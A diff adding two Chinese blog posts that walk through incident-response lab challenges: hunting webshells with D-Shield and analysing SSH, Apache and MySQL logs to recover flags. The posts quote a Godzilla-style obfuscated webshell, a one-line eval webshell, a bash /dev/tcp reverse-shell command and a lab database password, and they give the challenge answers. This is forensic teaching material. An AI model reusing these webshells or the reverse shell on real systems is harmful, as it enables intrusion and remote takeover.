@@ -1201,4 +1201,135 @@
         <tag>学习笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>玄机--webshell查杀</title>
+    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/</url>
+    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>护网要来了，好久没写博客了（滑跪）。前段时间朋友给了个号，做一波记录一下，一些语句和工具很值得学习。</p>
+<h4 id="黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h4><p>先把html文件夹下的源码下载到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf src.tar.gz ./*</span><br></pre></td></tr></table></figure>
+
+<p>然后用d盾查杀一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240531225522.png" ></p>
+<p>查看gz.php，看到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>黑客使用的什么工具的shell github地址的md5 flag{md5}</h4><p>gz.php看的出来用的是哥斯拉的木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">md5:39392de3218c333f794befef07ac9257</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h4><p>D盾看到有一个.Mysqli.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">md5:aebac0e58cd6c5fad1695ee4d1ac1919</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客免杀马完整路径-md5-flag-md5"><a href="#黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="黑客免杀马完整路径 md5 flag{md5}"></a>黑客免杀马完整路径 md5 flag{md5}</h4><p>d盾看到有一个top.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br></pre></td></tr></table></figure>
+
+<p>明显有混淆和编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/var/www/html/wap/top.php</span><br><span class="line">md5:eeff2eabfd9b7a6d26fc1a53d3f7d1de</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>玄机--日志分析</title>
+    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h3 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h3><h4 id="有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr </span><br></pre></td></tr></table></figure>
+
+<p>学一把这些语句</p>
+<p><strong>grep</strong>把有”Failed password for root”的行挑出来，**-a**是将文件作为文本文件处理，避免某些情况下文件被识别为二进制文件</p>
+<p><strong>awk</strong>把挑出来的行里第11个字段挑出来（按空格分），这里挑出那些ip地址</p>
+<p><strong>sort</strong>把ip地址排序，**-n<strong>按数字排序，</strong>-r**降序排序</p>
+<p><strong>uniq</strong>去重,<strong>-c</strong>输出中显示每个行重复出现的次数</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log<span class="comment"># cat auth.log* | grep -a &quot;Accept&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span></span><br><span class="line">      2 192.168.200.2</span><br><span class="line">      1 202.78.166.217</span><br></pre></td></tr></table></figure>
+
+<p>思路和上一道差不多，grep过滤的字段改成”Accept”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125; # 要删掉自己的ip</span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="爆破用户名字典是什么？如果有多个使用”,”分割"></a>爆破用户名字典是什么？如果有多个使用”,”分割</h4><p>上题解</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure>
+
+<p>对于这个perl比较陌生</p>
+<p><strong>Perl</strong> 命令，用于从匹配的日志行中提取用户名。</p>
+<p><code>while($_=&lt;&gt;)</code>逐行读取输入（即日志文件的内容）。</p>
+<p><code> /for(.*?) from/</code>使用正则表达式匹配 for 和from 之间的内容（即用户名）。</p>
+<p> <code>print &quot;$1\n&quot;;</code>打印匹配到的用户名（捕获组 <strong>$1</strong>）</p>
+<p>思路就是用grep过滤后用perl -e处理每行语句，把for和from之间的字段（通常是用户名）挑出来**，再进行后续操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h4><p>第一题的命令已经过滤出来了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="黑客登陆主机后新建了一个后门用户，用户名是多少"></a>黑客登陆主机后新建了一个后门用户，用户名是多少</h4><p>可以直接看&#x2F;etc&#x2F;passwd，多了个test2</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">test2:x:1000:1000::/home/test2:/bin/sh</span><br><span class="line">debian:x:1001:1001:Debian:/home/debian:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>也可以</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log* | grep -a &quot;useradd&quot; | grep -a &quot;linux-rz&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h3><h4 id="提交当天访问次数最多的IP，即黑客IP："><a href="#提交当天访问次数最多的IP，即黑客IP：" class="headerlink" title="提交当天访问次数最多的IP，即黑客IP："></a>提交当天访问次数最多的IP，即黑客IP：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      1 192.168.200.211</span><br></pre></td></tr></table></figure>
+
+<p>这次grep过滤的是”03&#x2F;Aug&#x2F;2023:08:”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客使用的浏览器指纹是什么，提交指纹的md5："><a href="#黑客使用的浏览器指纹是什么，提交指纹的md5：" class="headerlink" title="黑客使用的浏览器指纹是什么，提交指纹的md5："></a>黑客使用的浏览器指纹是什么，提交指纹的md5：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;192.168.200.2&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print $6&#125;&#x27; | uniq -c</span><br><span class="line">     12 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">      1 curl/7.74.0</span><br><span class="line">   6543 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>
+
+<p>直接grep上一题提取出来的ip</p>
+<p>**awk -F’”‘ ‘{print $6}’**这里awk -F指定双引号为分割符，取第六个字段</p>
+<blockquote>
+<p>对于 Apache 访问日志，双引号内的字段通常是请求方法、URL、协议和 User-Agent 字符串。第六个字段通常是 User-Agent。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">md5:2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看index-php页面被访问的次数，提交次数："><a href="#查看index-php页面被访问的次数，提交次数：" class="headerlink" title="查看index.php页面被访问的次数，提交次数："></a>查看index.php页面被访问的次数，提交次数：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;/index.php&quot; | wc -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>
+
+<p><strong>wc -l</strong>用于统计行数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看黑客IP访问了多少次，提交次数："><a href="#查看黑客IP访问了多少次，提交次数：" class="headerlink" title="查看黑客IP访问了多少次，提交次数："></a>查看黑客IP访问了多少次，提交次数：</h4><p>和上一题差不多</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &#x27;192.168.200.2 -&#x27; | wc -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:"></a>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;03/Aug/2023:08&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort -nr | uniq -c</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.211</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql日志分析"><a href="#mysql日志分析" class="headerlink" title="mysql日志分析"></a>mysql日志分析</h3><h4 id="黑客第一次写入的shell-flag-关键字符串"><a href="#黑客第一次写入的shell-flag-关键字符串" class="headerlink" title="黑客第一次写入的shell flag{关键字符串}"></a>黑客第一次写入的shell flag{关键字符串}</h4><p>找到sh.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/www/html# cat sh.php</span><br><span class="line">1	2	&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;	4</span><br><span class="line">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客反弹shell的ip-flag-ip"><a href="#黑客反弹shell的ip-flag-ip" class="headerlink" title="黑客反弹shell的ip flag{ip}"></a>黑客反弹shell的ip flag{ip}</h4><p>在日志中发现adminer.php中存在sqk注入，用sys_eval实现命令执行</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601005724.png" ></p>
+<p>主要在&#x2F;tmp&#x2F;1.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/log/apache2# cat /tmp/1.sh</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx"><a href="#黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx" class="headerlink" title="黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx"></a>黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</h4><p>先猜测是udf提权，在common.php找到数据库连接的账号密码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010114.png" ></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br><span class="line">连接到数据库</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">看一下plugin设置的目录</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010309.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010328.png" ></p>
+<p>有两个udf.so</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/usr/lib/mysql/plugin/udf.so</span><br><span class="line">md5:b1818bde4e310f3d23f1005185b973e7</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客获取的权限-flag-whoami后的值"><a href="#黑客获取的权限-flag-whoami后的值" class="headerlink" title="黑客获取的权限 flag{whoami后的值}"></a>黑客获取的权限 flag{whoami后的值}</h4><p>udf提权后拿到的是mysql权限，所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
 </search>
